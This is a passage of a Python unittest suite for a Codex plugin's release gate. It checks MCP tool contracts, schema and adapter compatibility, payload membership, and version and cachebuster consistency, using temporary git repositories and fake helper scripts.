                {issue.code for issue in issues},
            )

    def test_power_spec_release_contract_accepts_checked_in_surface(
        self,
    ) -> None:
        self.assertEqual(
            [],
            release_gate._validate_power_spec_contract(PLUGIN_ROOT),
        )

    def test_power_spec_release_contract_rejects_false_read_only(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            _copy_power_spec_contract_surface(root)
            mcp_path = root / "scripts" / "plot_rag_mcp.py"
            text = mcp_path.read_text(encoding="utf-8")
            marker = """\
        (
            "project_root",
            "power_spec",
            "expected_canon_revision",
            "idempotency_key",
        ),
    ),
    _tool(
        "list_power_systems",
"""
            replacement = marker.replace(
                "        ),\n    ),\n",
                "        ),\n        read_only=True,\n    ),\n",
                1,
            )
            self.assertIn(marker, text)
            mcp_path.write_text(
                text.replace(marker, replacement, 1),
                encoding="utf-8",
            )

            issues = release_gate._validate_power_spec_contract(root)

        self.assertIn(
            "POWER_SPEC_MCP_CONTRACT_MISMATCH",
            {issue.code for issue in issues},
        )

    def test_power_spec_release_contract_rejects_missing_tool(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            _copy_power_spec_contract_surface(root)
            mcp_path = root / "scripts" / "plot_rag_mcp.py"
            text = mcp_path.read_text(encoding="utf-8")
            needle = '"validate_power_spec_change"'
            self.assertIn(needle, text)
            mcp_path.write_text(
                text.replace(
                    needle,
                    '"validate_power_spec_change_removed"',
                    1,
                ),
                encoding="utf-8",
            )

            issues = release_gate._validate_power_spec_contract(root)

        self.assertIn(
            "POWER_SPEC_MCP_CONTRACT_MISMATCH",
            {issue.code for issue in issues},
        )

    def test_power_spec_release_contract_rejects_grant_issuer_surface(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            _copy_power_spec_contract_surface(root)
            mcp_path = root / "scripts" / "plot_rag_mcp.py"
            with mcp_path.open("a", encoding="utf-8") as handle:
                handle.write("\nHostApprovalAuthority = object\n")

            issues = release_gate._validate_power_spec_contract(root)

        self.assertIn(
            "POWER_SPEC_MCP_CONTRACT_MISMATCH",
            {issue.code for issue in issues},
        )

    def test_power_spec_payload_membership_rejects_missing_file(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            _copy_power_spec_contract_surface(root)
            missing = root / "tests" / "test_power_spec_lifecycle.py"
            missing.unlink()
            _init_git(root)
            _stage(root, ".")

            issues = release_gate._validate_power_spec_payload_membership(
                root
            )

        self.assertTrue(
            any(
                issue.code == "POWER_SPEC_PAYLOAD_MEMBER_MISSING"
                and issue.path == "tests/test_power_spec_lifecycle.py"
                for issue in issues
            )
        )

    def test_v15_release_contract_rejects_unsafe_default_switches(self) -> None:
        original = json.loads(
            (PLUGIN_ROOT / "templates" / "config.v3.json").read_text(
                encoding="utf-8"
            )
        )
        variants = {
            "prepare_enabled": (
                ("performance", "prepare_v2", "enabled"),
                True,
            ),
            "extraction_async": (
                ("performance", "extraction", "mode"),
                "async",
            ),
            "item_strict": (
                ("items", "strict_runtime_validation"),
                True,
            ),
            "delta_legacy": (
                ("items", "delta_version"),
                "plot-rag-delta/v3",
            ),
            "boolean_concurrency": (
                ("performance", "prepare_v2", "rerank_max_concurrency"),
                True,
            ),
        }
        for name, (path, replacement) in variants.items():
            with self.subTest(name=name):
                config = json.loads(json.dumps(original))
                target = config
                for part in path[:-1]:
                    target = target[part]
                target[path[-1]] = replacement

                issues = release_gate._validate_v15_contract(
                    PLUGIN_ROOT,
                    config,
                )

                self.assertIn(
                    "V15_CONFIG_CONTRACT_INVALID",
                    {issue.code for issue in issues},
                )

    def test_v15_release_contract_locks_schema_v6_and_delta_compatibility(
        self,
    ) -> None:
        config = json.loads(
            (PLUGIN_ROOT / "templates" / "config.v3.json").read_text(
                encoding="utf-8"
            )
        )
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            continuity = root / "scripts" / "continuity"
            continuity.mkdir(parents=True)
            (continuity / "schema.py").write_text(
                "\n".join(
                    [
                        "SCHEMA_VERSION = 5",
                        "ITEM_PROJECTION_SCHEMA_VERSION = 0",
                        "EVENT_TYPES = ('item_spec',)",
                        "",
                    ]
                ),
                encoding="utf-8",
            )
            (root / "scripts" / "state_rag.py").write_text(
                'DELTA_V3_SCHEMA = "plot-rag-delta/v4"\n',
                encoding="utf-8",
            )

            issues = release_gate._validate_v15_contract(root, config)

        codes = {issue.code for issue in issues}
        self.assertIn("V15_CONTINUITY_SCHEMA_MISMATCH", codes)
        self.assertIn("V15_ITEM_PROJECTION_SCHEMA_MISMATCH", codes)
        self.assertTrue(
            any(
                issue.code == "V15_DELTA_COMPATIBILITY_MISMATCH"
                and issue.path == "scripts/state_rag.py"
                and "DELTA_V3_SCHEMA" in issue.message
                for issue in issues
            )
        )

    def test_v15_release_contract_requires_public_schema_entrypoints(
        self,
    ) -> None:
        config = json.loads(
            (PLUGIN_ROOT / "templates" / "config.v3.json").read_text(
                encoding="utf-8"
            )
        )
        variants = {
            "missing_delta_entrypoint": (
                "schemas/plot-rag-delta/v4.schema.json",
                None,
                "V15_SCHEMA_REQUIRED_MISSING",
            ),
            "wrong_item_entrypoint_ref": (
                "schemas/plot-rag-item/v1.schema.json",
                ("../plot-rag-item.v1.json", "../plot-rag-item.v2.json"),
                "V15_SCHEMA_CONTRACT_MISMATCH",
            ),
            "missing_delta_target": (
                "schemas/plot-rag-delta/v4/envelope.schema.json",
                None,
                "V15_SCHEMA_REQUIRED_MISSING",
            ),
            "invalid_item_target": (
                "schemas/plot-rag-item.v1.json",
                ("{", ""),
                "V15_SCHEMA_INVALID",
            ),
            "broken_event_contract_ref": (
                (
                    "schemas/plot-rag-event-experience/v1/"
                    "event-experience-contract.schema.json"
                ),
                ("common.schema.json#/$defs/identifier", "missing.schema.json"),
                "V15_SCHEMA_REF_INVALID",
            ),
            "missing_event_seed_family_member": (
                (
                    "schemas/plot-rag-event-experience/v1/"
                    "event-seed.schema.json"
                ),
                None,
                "V15_SCHEMA_REQUIRED_MISSING",
            ),
            "missing_extraction_job": (
                "schemas/plot-rag-extraction/v1/extraction-job.schema.json",
                None,
                "V15_SCHEMA_REQUIRED_MISSING",
            ),
            "missing_worker_result_family_member": (
                "schemas/plot-rag-extraction/v1/worker-result.schema.json",
                None,
                "V15_SCHEMA_REQUIRED_MISSING",
            ),
        }
        for name, (relative, replacement, expected_code) in variants.items():
            with self.subTest(name=name), tempfile.TemporaryDirectory() as temporary:
                root = Path(temporary)
                _copy_v15_contract_surface(root)
                path = root / relative
                if replacement is None:
                    path.unlink()
                else:
                    before, after = replacement
                    text = path.read_text(encoding="utf-8")
                    self.assertIn(before, text)
                    path.write_text(
                        text.replace(before, after, 1),
                        encoding="utf-8",
                    )

                issues = release_gate._validate_v15_contract(root, config)

                self.assertIn(
                    expected_code,
                    {issue.code for issue in issues},
                )

    def test_v15_release_contract_locks_v4_constants_and_adapter_graph(
        self,
    ) -> None:
        config = json.loads(
            (PLUGIN_ROOT / "templates" / "config.v3.json").read_text(
                encoding="utf-8"
            )
        )
        variants = {
            "delta_v4_constant": (
                "scripts/state_rag.py",
                (
                    'DELTA_V4_SCHEMA = "plot-rag-delta/v4"',
                    'DELTA_V4_SCHEMA = "plot-rag-delta/v5"',
                ),
                "V15_DELTA_COMPATIBILITY_MISMATCH",
            ),
            "public_export": (
                "scripts/state_rag.py",
                (
                    '    "adapt_item_extraction_candidate",\n',
                    "",
                ),
                "V15_ADAPTER_CONTRACT_MISMATCH",
            ),
            "validator_to_normalizer_edge": (
                "scripts/state_rag.py",
                (
                    "            normalized = normalize_item_extraction_candidate(\n"
                    "                raw,",
                    "            normalized = dict(\n"
                    "                raw,",
                ),
                "V15_ADAPTER_CONTRACT_MISMATCH",
            ),
            "validator_to_advantage_normalizer_edge": (
                "scripts/state_rag.py",
                (
                    "            normalized = normalize_advantage_extraction_candidate(\n"
                    "                raw,",
                    "            normalized = dict(\n"
                    "                raw,",
                ),
                "V15_ADAPTER_CONTRACT_MISMATCH",
            ),
            "compatibility_splitter_item_family_edge": (
                "scripts/state_rag.py",
                (
                    "        if event_type in ITEM_DELTA_EVENT_TYPES:\n"
                    "            if schema_version != DELTA_V4_SCHEMA:",
                    "        if event_type.startswith(\"item_\"):\n"
                    "            if schema_version != DELTA_V4_SCHEMA:",
                ),
                "V15_ADAPTER_CONTRACT_MISMATCH",
            ),
            "compatibility_splitter_legacy_schema_edge": (
                "scripts/state_rag.py",
                (
                    "        if schema_version and schema_version != DELTA_V3_SCHEMA:\n"
                    "            raise StateRagError(\n"
                    "                f\"deltas[{index}] legacy candidate is not normalized v3\"\n"
                    "            )\n"
                    "        legacy.append(value)\n"
                    "    return legacy, items\n",
                    "        if schema_version and schema_version != "
                    "\"plot-rag-delta/v3\":\n"
                    "            raise StateRagError(\n"
                    "                f\"deltas[{index}] legacy candidate is not normalized v3\"\n"
                    "            )\n"
                    "        legacy.append(value)\n"
                    "    return legacy, items\n",
                ),
                "V15_ADAPTER_CONTRACT_MISMATCH",
            ),
            "commit_turn_to_compatibility_splitter_edge": (
                "scripts/state_rag.py",
                (
                    "                _legacy_deltas, item_candidates = "
                    "split_delta_v4_results(\n"
                    "                    deltas\n"
                    "                )",
                    "                _legacy_deltas, item_candidates = "
                    "(deltas, [])",
                ),
                "V15_ADAPTER_CONTRACT_MISMATCH",
            ),
            "continuity_adapter_constant": (
                "scripts/continuity/validators.py",
                (
                    'ITEM_DELTA_SCHEMA_VERSION = "plot-rag-delta/v4"',
                    'ITEM_DELTA_SCHEMA_VERSION = "plot-rag-delta/v5"',
                ),
                "V15_ADAPTER_CONTRACT_MISMATCH",
            ),
            "continuity_adapter_branch": (
                "scripts/continuity/validators.py",
                (
                    "        _normalize_item_envelope_fields(event)\n",
                    "        dict(event)\n",
                ),
                "V15_ADAPTER_CONTRACT_MISMATCH",
            ),
            "item_reducer_entrypoint": (
                "scripts/continuity/items.py",
                (
                    "def validate_item_event_sequence(\n",
                    "def validate_item_event_sequence_disconnected(\n",
                ),
                "V15_ADAPTER_CONTRACT_MISMATCH",
            ),
        }
        for name, (relative, replacement, expected_code) in variants.items():
            with self.subTest(name=name), tempfile.TemporaryDirectory() as temporary:
                root = Path(temporary)
                _copy_v15_contract_surface(root)
                path = root / relative
                before, after = replacement
                text = path.read_text(encoding="utf-8")
                self.assertIn(before, text)
                path.write_text(
                    text.replace(before, after, 1),
                    encoding="utf-8",
                )

                issues = release_gate._validate_v15_contract(root, config)

                self.assertIn(
                    expected_code,
                    {issue.code for issue in issues},
                )

    def test_v15_release_contract_rejects_duplicate_bindings_and_nested_shadow(
        self,
    ) -> None:
        config = json.loads(
            (PLUGIN_ROOT / "templates" / "config.v3.json").read_text(
                encoding="utf-8"
            )
        )
        duplicate_variants = {
            "constant": (
                '\nDELTA_V4_SCHEMA = "plot-rag-delta/v4"\n',
                "V15_DELTA_COMPATIBILITY_INVALID",
            ),
            "exports": (
                "\n__all__ = []\n",
                "V15_DELTA_COMPATIBILITY_INVALID",
            ),
            "function": (
                (
                    "\ndef validate_delta_v4_envelope(*args, **kwargs):\n"
                    "    return [], []\n"
                ),
                "V15_ADAPTER_CONTRACT_MISMATCH",
            ),
        }
        for name, (suffix, expected_code) in duplicate_variants.items():
            with self.subTest(name=name), tempfile.TemporaryDirectory() as temporary:
                root = Path(temporary)
                _copy_v15_contract_surface(root)
                path = root / "scripts" / "state_rag.py"
                path.write_text(
                    path.read_text(encoding="utf-8") + suffix,
                    encoding="utf-8",
                )

                issues = release_gate._validate_v15_contract(root, config)

                self.assertIn(
                    expected_code,
                    {issue.code for issue in issues},
                )

        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            _copy_v15_contract_surface(root)
            path = root / "scripts" / "state_rag.py"
            text = path.read_text(encoding="utf-8")
            function_start = text.index("def validate_delta_v4_envelope(")
            call_start = text.index(
                "normalize_item_extraction_candidate(",
                function_start,
            )
            text = (
                text[:call_start]
                + "dict("
                + text[
                    call_start + len("normalize_item_extraction_candidate(") :
                ]
            )
            docstring = (
                '    """Validate a mixed v4 envelope without changing '
                'legacy v3 semantics."""\n'
            )
            nested_shadow = (
                docstring
                + "\n"
                + "    def nested_shadow() -> None:\n"
                + "        normalize_item_extraction_candidate({}, \"\")\n"
            )
            self.assertIn(docstring, text)
            path.write_text(
                text.replace(docstring, nested_shadow, 1),
                encoding="utf-8",
            )

            issues = release_gate._validate_v15_contract(root, config)

        self.assertIn(
            "V15_ADAPTER_CONTRACT_MISMATCH",
            {issue.code for issue in issues},
        )

    def test_v15_release_contract_requires_schema_and_adapter_payload_access(
        self,
    ) -> None:
        config = json.loads(
            (PLUGIN_ROOT / "templates" / "config.v3.json").read_text(
                encoding="utf-8"
            )
        )
        with patch.object(
            release_gate,
            "PAYLOAD_ALLOWED_PREFIXES",
            tuple(
                prefix
                for prefix in release_gate.PAYLOAD_ALLOWED_PREFIXES
                if prefix not in {"schemas/", "scripts/"}
            ),
        ):
            issues = release_gate._validate_v15_contract(
                PLUGIN_ROOT,
                config,
            )

        payload_paths = {
            issue.path
            for issue in issues
            if issue.code == "V15_PAYLOAD_SURFACE_INVALID"
        }
        self.assertIn(
            "schemas/plot-rag-delta/v4.schema.json",
            payload_paths,
        )
        self.assertIn("scripts/state_rag.py", payload_paths)

    def test_v15_release_payload_rejects_ignored_untracked_required_member(
        self,
    ) -> None:
        ignored = (
            "schemas/plot-rag-delta/v4/item-candidate.schema.json"
        )
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            _copy_v15_contract_surface(root)
            _init_git(root)
            (root / ".gitignore").write_bytes(
                (ignored + "\n").encode("utf-8")
            )
            _run_git(root, "add", "-A")

            issues = release_gate._validate_v15_payload_membership(root)

        self.assertEqual(
            [ignored],
            [
                issue.path
                for issue in issues
                if issue.code == "V15_PAYLOAD_MEMBER_MISSING"
            ],
        )

    def test_release_version_requires_cachebuster_and_matching_head_tag(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            (root / ".codex-plugin").mkdir()
            (root / "scripts").mkdir()
            (root / ".codex-plugin" / "plugin.json").write_text(
                json.dumps(
                    {
                        "name": "plot-rag-gate",
                        "version": "1.4.1+codex.20260716160000",
                    }
                ),
                encoding="utf-8",
            )
            (root / "CHANGELOG.md").write_text(
                "# Changelog\n\n## 1.4.1 - 2026-07-16\n",
                encoding="utf-8",
            )
            (root / "README.md").write_text(
                "# Fixture\n\n`v1.4.1`\n",
                encoding="utf-8",
            )
            (root / "scripts" / "plot_state.py").write_text(
                'PLUGIN_VERSION = "1.4.1"\n',
                encoding="utf-8",
            )
            (root / "scripts" / "plot_rag_mcp.py").write_text(
                'SERVER_VERSION = "1.4.1"\n',
                encoding="utf-8",
            )
            (root / "scripts" / "state_rag.py").write_text(
                '_REMOTE_USER_AGENT = "plot-rag-gate/1.4.1 state-rag"\n',
                encoding="utf-8",
            )
            subprocess.run(
                ["git", "init", "--quiet"],
                cwd=root,
                check=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            subprocess.run(
                ["git", "add", "."],
                cwd=root,
                check=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            subprocess.run(
                [
                    "git",
                    "-c",
                    "user.name=Release Gate",
                    "-c",
                    "user.email=release-gate@example.invalid",
                    "commit",
                    "--quiet",
                    "-m",
                    "fixture",
                ],
                cwd=root,
                check=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )

            missing_cachebuster = release_gate._validate_versions(
                root,
                {"version": "1.4.1"},
            )
            subprocess.run(
                ["git", "tag", "v9.9.9"],
                cwd=root,
                check=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            wrong_tag = release_gate._validate_versions(
                root,
                {"version": "1.4.1+codex.20260716160000"},
            )
            committed_dev = release_gate._validate_versions(
                root,
                {"version": "1.4.1+codex.dev"},
            )
            invalid_calendar_cachebuster = release_gate._validate_versions(
                root,
                {"version": "1.4.1+codex.99999999999999"},
            )
            with patch.dict(
                os.environ,
                {
                    "GITHUB_REF_TYPE": "tag",
                    "GITHUB_REF_NAME": "preview-build",
                },
                clear=False,
            ):
                wrong_github_tag = release_gate._validate_versions(
                    root,
                    {"version": "1.4.1+codex.20260716160000"},
                )

        self.assertIn(
            "VERSION_CACHEBUSTER_MISSING",
            {issue.code for issue in missing_cachebuster},
        )
        self.assertIn(
            "VERSION_TAG_MISMATCH",
            {issue.code for issue in wrong_tag},
        )
        self.assertIn(
            "VERSION_CACHEBUSTER_NOT_RELEASE",
            {issue.code for issue in committed_dev},
        )
        self.assertIn(
            "VERSION_CACHEBUSTER_NOT_RELEASE",
            {issue.code for issue in invalid_calendar_cachebuster},
        )
        self.assertIn(
            "VERSION_TAG_MISMATCH",
            {issue.code for issue in wrong_github_tag},
        )

    def test_release_version_rejects_state_rag_user_agent_mismatch(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            (root / ".codex-plugin").mkdir()
            (root / "scripts").mkdir()
            manifest = {
                "name": "plot-rag-gate",
                "version": "1.4.1+codex.20260716160000",
            }
            (root / ".codex-plugin" / "plugin.json").write_text(
                json.dumps(manifest),
                encoding="utf-8",
            )
            (root / "CHANGELOG.md").write_text(
                "# Changelog\n\n## 1.4.1 - 2026-07-16\n",
                encoding="utf-8",
            )
            (root / "README.md").write_text(
                "# Fixture\n\n`v1.4.1`\n",
                encoding="utf-8",
            )
            (root / "scripts" / "plot_state.py").write_text(
                'PLUGIN_VERSION = "1.4.1"\n',
                encoding="utf-8",
            )
            (root / "scripts" / "plot_rag_mcp.py").write_text(
                'SERVER_VERSION = "1.4.1"\n',
                encoding="utf-8",
            )
            (root / "scripts" / "state_rag.py").write_text(
                '_REMOTE_USER_AGENT = "plot-rag-gate/1.4.0 state-rag"\n',
                encoding="utf-8",
            )
            _init_git(root)
            _stage(root, ".")
            _run_git(
                root,
                "-c",
                "user.name=Release Gate",
                "-c",
                "user.email=release-gate@example.invalid",
                "commit",
                "--quiet",
                "-m",
                "fixture",
            )

            issues = release_gate._validate_versions(root, manifest)

        self.assertTrue(
            any(
                issue.code == "VERSION_RUNTIME_MISMATCH"
                and issue.path == "scripts/state_rag.py"
                and "plot-rag-gate/1.4.1 state-rag" in issue.message
                for issue in issues
            )
        )

    @patch.dict(
        os.environ,
        {
            "GITHUB_REF_TYPE": "branch",
            "GITHUB_REF_NAME": "fixture",
        },
        clear=False,
    )
    def test_cachebuster_changes_with_same_base_payload_and_allows_base_bump(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            (root / ".codex-plugin").mkdir()
            (root / "scripts").mkdir()

            def write_version(base: str, token: str) -> dict[str, str]:
                manifest = {
                    "name": "plot-rag-gate",
                    "version": f"{base}+codex.{token}",
                }
                (root / ".codex-plugin" / "plugin.json").write_text(
                    json.dumps(manifest),
                    encoding="utf-8",
                )
                (root / "CHANGELOG.md").write_text(
                    f"# Changelog\n\n## {base} - 2026-07-17\n",
                    encoding="utf-8",
                )
                (root / "README.md").write_text(
                    f"# Fixture\n\n`v{base}`\n",
                    encoding="utf-8",
                )
                (root / "scripts" / "plot_state.py").write_text(
                    f'PLUGIN_VERSION = "{base}"\n',
                    encoding="utf-8",
                )
                (root / "scripts" / "plot_rag_mcp.py").write_text(
                    f'SERVER_VERSION = "{base}"\n',
                    encoding="utf-8",
                )
                (root / "scripts" / "state_rag.py").write_text(
                    f'_REMOTE_USER_AGENT = "plot-rag-gate/{base} state-rag"\n',
                    encoding="utf-8",
                )
                return manifest

            def commit(message: str) -> None:
                _run_git(
                    root,
                    "-c",
                    "user.name=Release Gate",
                    "-c",
                    "user.email=release-gate@example.invalid",
                    "commit",
                    "--quiet",
                    "-m",
                    message,
                )

            manifest = write_version("1.4.2", "20260717120000")
            _init_git(root)
            _stage(root, ".")
            commit("initial release")

            original_release_run = release_gate._run

            def fail_git_diff(
                arguments: list[str],
                *,
                cwd: Path,
                check: bool = True,
            ) -> subprocess.CompletedProcess[str]:
                if len(arguments) > 1 and arguments[1] == "diff":
                    return subprocess.CompletedProcess(
                        args=arguments,
                        returncode=1,
                        stdout="",
                        stderr="fixture Git diff failure",
                    )
                return original_release_run(arguments, cwd=cwd, check=check)

            with patch.object(
                release_gate,
                "_run",
                side_effect=fail_git_diff,
            ):
                diff_failure = release_gate._validate_versions(root, manifest)

            with (root / "README.md").open("a", encoding="utf-8") as stream:
                stream.write("\nsame-base payload change\n")
            _stage(root, "README.md")
            staged_stale = release_gate._validate_versions(root, manifest)

            manifest = {
                "name": "plot-rag-gate",
                "version": "1.4.2+codex.20260717120001",
            }
            (root / ".codex-plugin" / "plugin.json").write_text(
                json.dumps(manifest),
                encoding="utf-8",
            )
            _stage(root, ".codex-plugin/plugin.json")
            staged_fresh = release_gate._validate_versions(root, manifest)
            commit("same-base release with fresh cachebuster")
            committed_fresh = release_gate._validate_versions(root, manifest)

            with (root / "README.md").open("a", encoding="utf-8") as stream:
                stream.write("\ncommitted stale payload\n")
            _stage(root, "README.md")
            commit("same-base release with stale cachebuster")
            committed_stale = release_gate._validate_versions(root, manifest)

            manifest = {
                "name": "plot-rag-gate",
                "version": "1.4.2+codex.20260717120002",
            }
            (root / ".codex-plugin" / "plugin.json").write_text(
                json.dumps(manifest),
                encoding="utf-8",
            )
            _stage(root, ".codex-plugin/plugin.json")
            stale_head_repair = release_gate._validate_versions(root, manifest)
            commit("repair stale HEAD with a fresh cachebuster")
            repaired_commit = release_gate._validate_versions(root, manifest)

            manifest = write_version("1.4.3", "20260717120002")
            _stage(root, ".")
            commit("semantic base bump")
            base_bump = release_gate._validate_versions(root, manifest)

        self.assertEqual(
            ["VERSION_CACHEBUSTER_CHECK_FAILED"],
            [issue.code for issue in diff_failure],
        )
        self.assertIn("fixture Git diff failure", diff_failure[0].message)
        self.assertEqual(
            ["VERSION_CACHEBUSTER_STALE"],
            [issue.code for issue in staged_stale],
        )
        self.assertIn("staged index relative to HEAD", staged_stale[0].message)
        self.assertEqual([], staged_fresh)
        self.assertEqual([], committed_fresh)
        self.assertEqual(
            ["VERSION_CACHEBUSTER_STALE"],
            [issue.code for issue in committed_stale],
        )
        self.assertIn(
            "HEAD relative to its first parent",
            committed_stale[0].message,
        )
        self.assertEqual([], stale_head_repair)
        self.assertEqual([], repaired_commit)
        self.assertEqual([], base_bump)

    def test_release_version_rejects_expected_tag_on_old_commit(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            (root / ".codex-plugin").mkdir()
            (root / "scripts").mkdir()
            manifest = {
                "name": "plot-rag-gate",
                "version": "1.4.1+codex.20260716160000",
            }
            (root / ".codex-plugin" / "plugin.json").write_text(
                json.dumps(manifest),
                encoding="utf-8",
            )
            (root / "CHANGELOG.md").write_text(
                "# Changelog\n\n## 1.4.1 - 2026-07-16\n",
                encoding="utf-8",
            )
            (root / "README.md").write_text(
                "# Fixture\n\n`v1.4.1`\n",
                encoding="utf-8",
            )
            (root / "scripts" / "plot_state.py").write_text(
                'PLUGIN_VERSION = "1.4.1"\n',
                encoding="utf-8",
            )
            (root / "scripts" / "plot_rag_mcp.py").write_text(
                'SERVER_VERSION = "1.4.1"\n',
                encoding="utf-8",
            )
            (root / "scripts" / "state_rag.py").write_text(
                '_REMOTE_USER_AGENT = "plot-rag-gate/1.4.1 state-rag"\n',
                encoding="utf-8",
            )
            _init_git(root)
            _stage(root, ".")
            _run_git(
                root,
                "-c",
                "user.name=Release Gate",
                "-c",
                "user.email=release-gate@example.invalid",
                "commit",
                "--quiet",
                "-m",
                "tagged release",
            )
            _run_git(root, "tag", "v1.4.1")
            (root / "README.md").write_text(
                "# Fixture\n\n`v1.4.1`\n\npost-tag change\n",
                encoding="utf-8",
            )
            _stage(root, "README.md")
            _run_git(
                root,
                "-c",
                "user.name=Release Gate",
                "-c",
                "user.email=release-gate@example.invalid",
                "commit",
                "--quiet",
                "-m",
                "later commit",
            )

            issues = release_gate._validate_versions(root, manifest)

        self.assertTrue(
            any(
                issue.code == "VERSION_TAG_MISMATCH"
                and "not HEAD" in issue.message
                for issue in issues
            )
        )

    def test_cachebuster_wrapper_normalizes_official_helper_crlf(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary) / "plugin"
            manifest = root / ".codex-plugin" / "plugin.json"
            manifest.parent.mkdir(parents=True)
            manifest.write_bytes(
                b'{\n  "name": "plot-rag-gate",\n'
                b'  "version": "1.4.2+codex.dev"\n}\n'
            )
            helper = Path(temporary) / "fake_cachebuster.py"
            helper.write_text(
                "\n".join(
                    [
                        "import json",
                        "import sys",
                        "from pathlib import Path",
                        "path = Path(sys.argv[1]) / '.codex-plugin' / 'plugin.json'",
                        "payload = json.loads(path.read_text(encoding='utf-8'))",
                        "payload['version'] = '1.4.2+codex.20260716123456'",
                        "text = json.dumps(payload, indent=2) + '\\n'",
                        "path.write_bytes(text.replace('\\n', '\\r\\n').encode('utf-8'))",
                        "print('fixture helper completed')",
                    ]
                )
                + "\n",
                encoding="utf-8",
            )

            version, output = release_gate.update_plugin_cachebuster(
                root,
                helper=helper,
            )
            updated_bytes = manifest.read_bytes()

        self.assertEqual("1.4.2+codex.20260716123456", version)
        self.assertIn("fixture helper completed", output)
        self.assertNotIn(b"\r", updated_bytes)

    def test_cachebuster_rejects_invalid_calendar_token_and_restores_manifest(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary) / "plugin"
            manifest = root / ".codex-plugin" / "plugin.json"
            manifest.parent.mkdir(parents=True)
            original_bytes = (
                b'{\n  "name": "plot-rag-gate",\n'
                b'  "version": "1.4.2+codex.dev"\n}\n'
            )
            manifest.write_bytes(original_bytes)
            helper = Path(temporary) / "invalid_cachebuster.py"
            helper.write_text(
                "\n".join(
                    [
                        "import json",
                        "import sys",
                        "from pathlib import Path",
                        "path = Path(sys.argv[1]) / '.codex-plugin' / 'plugin.json'",
                        "payload = json.loads(path.read_text(encoding='utf-8'))",
                        "payload['version'] = '1.4.2+codex.99999999999999'",
                        "path.write_text(json.dumps(payload), encoding='utf-8')",
                    ]
                )
                + "\n",
                encoding="utf-8",
            )

            with self.assertRaisesRegex(ValueError, "14-digit UTC token"):
                release_gate.update_plugin_cachebuster(root, helper=helper)

            self.assertEqual(original_bytes, manifest.read_bytes())

    def test_cachebuster_restores_manifest_on_system_exit(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary) / "plugin"
            manifest = root / ".codex-plugin" / "plugin.json"
            helper = Path(temporary) / "interrupting_cachebuster.py"
            manifest.parent.mkdir(parents=True)
            original_bytes = (
                b'{\n  "name": "plot-rag-gate",\n'
                b'  "version": "1.4.2+codex.dev"\n}\n'
            )
            manifest.write_bytes(original_bytes)
            helper.write_text("pass\n", encoding="utf-8")

            def interrupt_after_update(*_args, **_kwargs):
                manifest.write_text(
                    json.dumps(
                        {
                            "name": "plot-rag-gate",
                            "version": "1.4.2+codex.20260716123456",
                        }
                    ),
                    encoding="utf-8",
                )
                raise SystemExit(17)

            with (
                patch.object(
                    release_gate.subprocess,
                    "run",
                    side_effect=interrupt_after_update,
                ),
                self.assertRaises(SystemExit),
            ):
                release_gate.update_plugin_cachebuster(root, helper=helper)

            self.assertEqual(original_bytes, manifest.read_bytes())

    def test_cachebuster_command_rolls_back_worktree_and_index_on_failure(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary) / "plugin"
            manifest = root / ".codex-plugin" / "plugin.json"
            manifest.parent.mkdir(parents=True)
            original_bytes = (
                b'{\n  "name": "plot-rag-gate",\n'
                b'  "version": "1.4.2+codex.dev"\n}\n'
            )
            manifest.write_bytes(original_bytes)
            _init_git(root)
            _stage(root, ".codex-plugin/plugin.json")
            original_index_bytes = _index_bytes(
                root,
                ".codex-plugin/plugin.json",
            )
            helper = Path(temporary) / "valid_cachebuster.py"
            helper.write_text(
                "\n".join(
                    [
                        "import json",
                        "import sys",
                        "from pathlib import Path",
                        "path = Path(sys.argv[1]) / '.codex-plugin' / 'plugin.json'",
                        "payload = json.loads(path.read_text(encoding='utf-8'))",
                        "payload['version'] = '1.4.2+codex.20260716123456'",
                        "path.write_text(json.dumps(payload), encoding='utf-8')",
                    ]
                )
                + "\n",
                encoding="utf-8",
            )
            forced_issue = release_gate.GateIssue(
                "FIXTURE_POST_UPDATE_FAILURE",
                ".",
                "force transactional rollback",
            )

            with (
                patch.object(
                    release_gate,
                    "validate_source",
                    return_value=[forced_issue],
                ),
                patch("builtins.print"),
            ):
                result = release_gate._command_cachebuster(
                    SimpleNamespace(
                        root=str(root),
                        helper=str(helper),
                    )
                )

            self.assertEqual(1, result)
            self.assertEqual(original_bytes, manifest.read_bytes())
            self.assertEqual(
                original_index_bytes,
                _index_bytes(root, ".codex-plugin/plugin.json"),
            )

    def test_cachebuster_command_rolls_back_index_on_keyboard_interrupt(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary) / "plugin"
            manifest = root / ".codex-plugin" / "plugin.json"
            manifest.parent.mkdir(parents=True)
            original_bytes = (
                b'{\n  "name": "plot-rag-gate",\n'
                b'  "version": "1.4.2+codex.dev"\n}\n'
            )
            manifest.write_bytes(original_bytes)
            _init_git(root)
            _stage(root, ".codex-plugin/plugin.json")
            original_index_bytes = _index_bytes(
                root,
                ".codex-plugin/plugin.json",
            )
            helper = Path(temporary) / "valid_cachebuster.py"
            helper.write_text(
                "\n".join(
                    [
                        "import json",
                        "import sys",
                        "from pathlib import Path",
